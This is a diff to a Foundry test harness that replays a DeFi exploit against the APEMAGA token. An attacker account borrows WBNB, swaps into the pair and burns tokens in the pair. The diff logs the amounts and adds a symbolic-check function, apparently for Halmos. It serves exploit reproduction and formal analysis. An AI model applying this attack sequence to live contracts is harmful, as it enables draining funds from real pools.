@@ -178,14 +178,22 @@ contract APEMAGATestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 2200 * 1e18);
         borrow_wbnb_owner(2200 * 1e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", wbnb.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            (pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 99) /
+                100
+        );
         swap_pair_attacker_wbnb_apemaga(
             wbnb.balanceOf(attacker),
             (pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 99) /
                 100
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", 0);
         burn_apemaga_pair(0);
         printBalance("After step2 ");
         require(attackGoal(), "Attack failed!");
@@ -193,6 +201,21 @@ contract APEMAGATestBase is Test, BlockLoader {
     }
 
     function check_gt(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 >= amt0);
+        borrow_wbnb_owner(amt0);
+        swap_pair_attacker_wbnb_apemaga(amt1, amt2);
+        burn_apemaga_pair(amt3);
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_gt_halmos(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
